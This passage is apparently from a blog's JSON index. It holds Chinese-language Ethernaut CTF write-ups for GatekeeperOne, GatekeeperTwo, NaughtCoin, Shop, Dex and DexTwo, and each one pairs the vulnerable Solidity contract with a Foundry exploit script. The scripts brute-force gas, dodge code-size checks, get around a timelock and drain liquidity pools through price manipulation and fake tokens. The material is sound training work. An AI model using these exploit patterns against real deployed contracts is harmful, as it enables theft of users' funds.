3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, key));            if (success) &#123;                break;            &#125;        &#125;\n\n对于gateThree需要满足以下三个条件\nrequire(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);\n\n\n观察第一个条件和第三个条件其实是大同小异的都是后面两个Byte跟uint32(uint64(_gateKey)相同，前面的bytes不需要管，因为存在类型转换的填充技术，会用00补上。\n第二个条件就是需要满足uint32(uint64(_gateKey)从右往左数第三第四个Byte不与uint64(_gateKey)相同,所以这里使用AND运算\n0 AND 0   // 00 AND 1   // 01 AND 0   // 01 AND 1   // 1bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF\n\n\n\nExpcontract GatekeeperOneSolution is Script &#123;    GatekeeperOne gatekeeperOne = GatekeeperOne(0x69e4C5489391A439f0C690d9328070eD91680C28);    function run() public &#123;        vm.startBroadcast();        GatekeeperOneAttack attack = new GatekeeperOneAttack(gatekeeperOne);        attack.attack();        vm.stopBroadcast();    &#125;&#125;contract GatekeeperOneAttack &#123;    GatekeeperOne gatekeeperOne;    constructor(GatekeeperOne _gatekeeperOne) &#123;        gatekeeperOne = _gatekeeperOne;    &#125;    function attack() external &#123;        bytes8 key = bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF;        for (uint256 i = 0; i &lt; 8191; i++) &#123;            (bool success,) =                address(gatekeeperOne).call&#123;gas: i + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, key));            if (success) &#123;                break;            &#125;        &#125;    &#125;&#125;\n\n\n\nGatekeeperTwo// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperTwo &#123;    address public entrant;    modifier gateOne() &#123;        require(msg.sender != tx.origin);        _;    &#125;    modifier gateTwo() &#123;        uint256 x;        assembly &#123;            x := extcodesize(caller())        &#125;        require(x == 0);        _;    &#125;    modifier gateThree(bytes8 _gateKey) &#123;        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);        _;    &#125;    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;        entrant = tx.origin;        return true;    &#125;&#125;\n\n思路gateTwo():一个内联汇编块由 assembly { ... } 标记的，其中大括号内的代码是 Yul 语言中的代码。其中extcodesize(caller())表示的是获取调用当前函数者（caller）相当于msg.sender地址上的代码大小（字节数）。在以太坊中，一个合约的“代码”只有在构造函数（Constructor）完全执行结束之后，才会真正存储到区块链上。\n核心机制：Init Code vs Runtime Code在 EVM 层面，智能合约的代码分为两部分：\n\n初始化代码 (Creation Code &#x2F; Init Code)：\n这是包含 constructor 逻辑的代码。\n它的作用是生成并返回最终要存储在链上的代码。\n重点：当你在部署合约时，EVM 正在执行这部分代码。\n\n\n运行时代码 (Runtime Code)：\n这是合约部署完成后，永久存储在区块链地址上的代码（也就是业务逻辑）。\nextcodesize 统计的就是这部分代码的大小。\n\n\n\n所以说只需要在合约构造函数中实现攻击，就可以绕过检测\nassembly &#123;            x := extcodesize(caller())        &#125;\n\n\n\ngateThree()：已知等式a ^ b = c可以得到a ^ c = b，所以\nbytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n\n\n\nExp// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Script.sol&quot;;import &quot;../src/GatekeeperTwo.sol&quot;;contract GatekeeperTwoSolution is Script &#123;    GatekeeperTwo gatekeeperTwo = GatekeeperTwo(0x6abe30b40bFbC5377EbF15eC708c4Fa25B31d0b4);    function run() public &#123;        vm.startBroadcast();        GatekeeperTwoAttack attack = new GatekeeperTwoAttack(gatekeeperTwo);        vm.stopBroadcast();    &#125;&#125;contract GatekeeperTwoAttack &#123;    GatekeeperTwo gatekeeperTwo;    //require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);    //uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max ==  uint64(_gateKey)    constructor(GatekeeperTwo _gatekeeperTwo) &#123;        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);        gatekeeperTwo = _gatekeeperTwo;        address(gatekeeperTwo).call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey));    &#125;&#125;\nNaught Coincontract NaughtCoin is ERC20 &#123;    // string public constant name = &#x27;NaughtCoin&#x27;;    // string public constant symbol = &#x27;0x0&#x27;;    // uint public constant decimals = 18;    uint256 public timeLock = block.timestamp + 10 * 365 days;    uint256 public INITIAL_SUPPLY;    address public player;    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;        player = _player;        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));        // _totalSupply = INITIAL_SUPPLY;        // _balances[player] = INITIAL_SUPPLY;        _mint(player, INITIAL_SUPPLY);        emit Transfer(address(0), player, INITIAL_SUPPLY);    &#125;    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;        super.transfer(_to, _value);    &#125;    // Prevent the initial owner from transferring tokens until the timelock has passed    modifier lockTokens() &#123;        if (msg.sender == player) &#123;            require(block.timestamp &gt; timeLock);            _;        &#125; else &#123;            _;        &#125;    &#125;&#125;\n\n\n\n思路在ERC20标准中存在两个转钱的方法，分别是transfer和transferFrom\nfunction transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;      address spender = _msgSender();      _spendAllowance(from, spender, amount);      _transfer(from, to, amount);      return true;  &#125;\n\n在是使用transferFrom要先使用approve方法，简单来说就是代币拥有者允许某个地址的交易代币的数量。\t\nExpcontract NaughtCoinSolution is Script &#123;    NaughtCoin naughtCoin = NaughtCoin(0xC0Faf18D2b14706353A4a62D752b1Ca4bbe63b5c);    function run() public &#123;        vm.startBroadcast();        NaughtCoinAttack attack = new NaughtCoinAttack(address(naughtCoin));        ERC20(address(naughtCoin)).approve(address(attack), 1000000 * 1e18);        attack.attack();        vm.stopBroadcast();    &#125;&#125;contract NaughtCoinAttack &#123;    address public constant PLAYER = 0x1fec23bf3a1424726dD60b998B9BCf6b3B42b800;    NaughtCoin naughtCoin;    constructor(address _naughtCoin) &#123;        naughtCoin = NaughtCoin(_naughtCoin);    &#125;    function attack() external &#123;        naughtCoin.transferFrom(PLAYER, address(this), 1000000 * 1e18);    &#125;&#125;\n","categories":["CTF-Ethernaut Writeups"],"tags":["Web3 Security","Ethernaut"]},{"title":"Ethernaut 21-23","url":"/2026/02/03/ethernaut4/","content":"Shop// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IBuyer &#123;    function price() external view returns (uint256);&#125;contract Shop &#123;    uint256 public price = 100;    bool public isSold;    function buy() public &#123;        IBuyer _buyer = IBuyer(msg.sender);        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;            isSold = true;            price = _buyer.price();        &#125;    &#125;&#125;\n\n\n\n思路类似与不知明的外部调用，合约采用接口调用，外部接口的函数时不清楚的，所以我们可以控制返回的值，从而控制目标合约\nExpinterface Ishop &#123;    function buy() external;    function price() external view returns (uint256);    function isSold() external view returns (bool);&#125;contract ShopSolution is Script &#123;    function run() public &#123;        vm.startBroadcast();        Ishop shop = Ishop(0x9D94F04c402e710770643DdEcCf0e74fBf21e58A);        console.log(&quot;getprice&quot;, shop.price());        console.log(&quot;isSold&quot;, shop.isSold());        ShopAttack attack = new ShopAttack(address(shop));        attack.attack();        console.log(&quot;getpriceAfter&quot;, shop.price());        console.log(&quot;isSoldAfter&quot;, shop.isSold());        vm.stopBroadcast();    &#125;&#125;contract ShopAttack &#123;    Ishop public shop;    constructor(address _shopAddress) &#123;        shop = Ishop(_shopAddress);    &#125;    function attack() external &#123;        shop.buy();    &#125;    function price() external view returns (uint256 _price) &#123;        //通过判断shop.isSold()的值返回不同的价格，当isSold为false时返回100，为true时返回1        if (!shop.isSold()) return 100;        else return 1;    &#125;&#125;\n\n\n\nDex// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;lib/contracts/token/ERC20/IERC20.sol&quot;;import &quot;lib/contracts/token/ERC20/ERC20.sol&quot;;import &quot;lib/contracts/access/Ownable.sol&quot;;contract Dex is Ownable &#123;    address public token1;    address public token2;    constructor() &#123;&#125;    function setTokens(address _token1, address _token2) public onlyOwner &#123;        token1 = _token1;        token2 = _token2;    &#125;    //向Dex合约中添加流动性，只有合约拥有者可以调用此函数    function addLiquidity(address token_address, uint256 amount) public onlyOwner &#123;        IERC20(token_address).transferFrom(msg.sender, address(this), amount);    &#125;    function swap(address from, address to, uint256 amount) public &#123;        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);        uint256 swapAmount = getSwapPrice(from, to, amount);        IERC20(from).transferFrom(msg.sender, address(this), amount);        IERC20(to).approve(address(this), swapAmount);        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);    &#125;    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) &#123;        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));    &#125;    function approve(address spender, uint256 amount) public &#123;        SwappableToken(token1).approve(msg.sender, spender, amount);        SwappableToken(token2).approve(msg.sender, spender, amount);    &#125;    function balanceOf(address token, address account) public view returns (uint256) &#123;        return IERC20(token).balanceOf(account);    &#125;&#125;contract SwappableToken is ERC20 &#123;    address private _dex;    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)        ERC20(name, symbol)    &#123;        _mint(msg.sender, initialSupply);        _dex = dexInstance;    &#125;    function approve(address owner, address spender, uint256 amount) public &#123;        require(owner != _dex, &quot;InvalidApprover&quot;);        super._approve(owner, spender, amount);    &#125;&#125;\n\n\n\n思路函数function getSwapPrice有大问题，每次swap一次之后token都会变多，换着换着就会导致整个池子的钱都拿走了，详细可以看Exp的变化注释\nExpinterface Idex &#123;    function swap(address from, address to, uint256 amount) external;    function approve(address spender, uint256 amount) external;    function token1() external view returns (address);    function token2() external view returns (address);    function balanceOf(address token, address account) external view returns (uint256);&#125;//**********************************************************************************************************************// Dex\t\tUser// token1\ttoken2\ttoken1\ttoken2// 100\t100\t10\t10// 110\t90\t0\t20// 86\t110\t24\t0// 110\t80\t0\t30// 69\t110\t41\t0// 110\t45\t0\t65// 0\t90\t110\t20//**********************************************************************************************************************contract DexSolution is Script &#123;    function run() external &#123;        vm.startBroadcast();        Idex idex = Idex(0x823d27e854e8c56313BC8913c5f2eFcE77AFE466);        idex.approve(address(idex), 500);        address token1 = idex.token1();        address token2 = idex.token2();        console.log(&quot;token1Before&quot;, idex.balanceOf(token1, msg.sender));        console.log(&quot;token2Before&quot;, idex.balanceOf(token2, msg.sender));        idex.swap(token1, token2, 10);        idex.swap(token2, token1, 20);        idex.swap(token1, token2, 24);        idex.swap(token2, token1, 30);        idex.swap(token1, token2, 41);        // 110 = (amountIn * 110) / 45  =&gt;  amountIn = 45        idex.swap(token2, token1, 45);        console.log(&quot;token1After&quot;, idex.balanceOf(token1, msg.sender));        console.log(&quot;token2After&quot;, idex.balanceOf(token2, msg.sender));        vm.stopBroadcast();    &#125;&#125;\n\n\n\nDex2// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;lib/contracts/token/ERC20/IERC20.sol&quot;;import &quot;lib/contracts/token/ERC20/ERC20.sol&quot;;import &quot;lib/contracts/access/Ownable.sol&quot;;contract DexTwo is Ownable &#123;    address public token1;    address public token2;    constructor() &#123;&#125;    function setTokens(address _token1, address _token2) public onlyOwner &#123;        token1 = _token1;        token2 = _token2;    &#125;    function add_liquidity(address token_address, uint256 amount) public onlyOwner &#123;        IERC20(token_address).transferFrom(msg.sender, address(this), amount);    &#125;    function swap(address from, address to, uint256 amount) public &#123;        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);        uint256 swapAmount = getSwapAmount(from, to, amount);        IERC20(from).transferFrom(msg.sender, address(this), amount);        IERC20(to).approve(address(this), swapAmount);        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);    &#125;    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) &#123;        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));    &#125;    function approve(address spender, uint256 amount) public &#123;        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);    &#125;    function balanceOf(address token, address account) public view returns (uint256) &#123;        return IERC20(token).balanceOf(account);    &#125;&#125;contract SwappableTokenTwo is ERC20 &#123;    address private _dex;    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)        ERC20(name, symbol)    &#123;        _mint(msg.sender, initialSupply);        _dex = dexInstance;    &#125;    function approve(address owner, address spender, uint256 amount) public &#123;        require(owner != _dex, &quot;InvalidApprover&quot;);        super._approve(owner, spender, amount);    &#125;&#125;\n\n\n\n思路跟上关的区别在于就是require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), “Invalid tokens”)就会导致Dex可以接受任何 token进行swap而不限于token1和token2。这样用自创可控的Token就可以把全部的Token1和Token2全部换出来\nExp// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Script.sol&quot;;import &quot;lib/contracts/token/ERC20/ERC20.sol&quot;;interface IdexTwo &#123;    function swap(address from, address to, uint256 amount) external;    function approve(address spender, uint256 amount) external;    function token1() external view returns (address);    function token2() external view returns (address);    function balanceOf(address token, address account) external view returns (uint256);&#125;/** *     Step  |           DEX          |          Player *           | token1 - token2 - WETH | token1 - token2 - WETH *   --------------------------------------------------------- *     Init  |   100     100     100  |    10      10     300 *   Swap 1  |     0     100     200  |   110      10     200 *   Swap 2  |     0       0     400  |   110     110       0 */contract DexTwoSolution is Script &#123;    function run() external &#123;        vm.startBroadcast();        IdexTwo idex = IdexTwo(0x18517a9c6aC1a4f7f403F6C8F0308b1Dbd066109);        ExpToken exp = new ExpToken();        exp.approve(address(idex), 500);        exp.transfer(address(idex), 100);        address token1 = idex.token1();        address token2 = idex.token2();        console.log(&quot;token1Before&quot;, idex.balanceOf(token1, msg.sender));        console.log(&quot;token2Before&quot;, idex.balanceOf(token2, msg.sender));        console.log(&quot;ExpTokenBefore&quot;, exp.balanceOf(address(idex)));        idex.swap(address(exp), token1, 100);        idex.swap(address(exp), token2, 200);        console.log(&quot;token1After&quot;, idex.balanceOf(token1, msg.sender));        console.log(&quot;token2After&quot;, idex.balanceOf(token2, msg.sender));        vm.stopBroadcast();    &#125;&#125;contract ExpToken is ERC20 &#123;    constructor() ERC20(&quot;ExpToken&quot;, &quot;EXP&quot;) &#123;        _mint(msg.sender, 400);    &#125;&#125;\n","categories":["CTF-Ethernaut Writeups"],"tags":["Web3 Security","Ethernaut"]}]